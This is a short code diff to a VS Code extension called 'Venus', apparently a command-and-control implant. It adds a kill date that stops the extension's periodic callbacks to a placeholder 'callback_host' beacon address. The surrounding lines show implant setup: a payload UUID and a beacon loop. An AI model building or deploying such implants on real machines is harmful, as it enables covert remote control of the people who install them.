@@ -7,6 +7,7 @@ const axios = require('axios').default;
 
 const outchan = vscode.window.createOutputChannel("Venus");
 
+const killDate = new Date('killdate');
 const payloadUUID = "REPLACE_PAYLOAD_UUID"
 
 const baseURL = new url.URL('callback_host');
@@ -152,6 +153,11 @@ function activate(context) {
 	const callbackUUID = context.globalState.get('productID')
 	// Build parameter is in seconds, setInterval() wants milliseconds
 	const interval = callback_interval * 1000
+
+	const today = new Date()
+	if (today > killDate) {
+		return
+	}
 
 	if (callbackUUID != null) {
 		setInterval(mainLoop, interval, context);
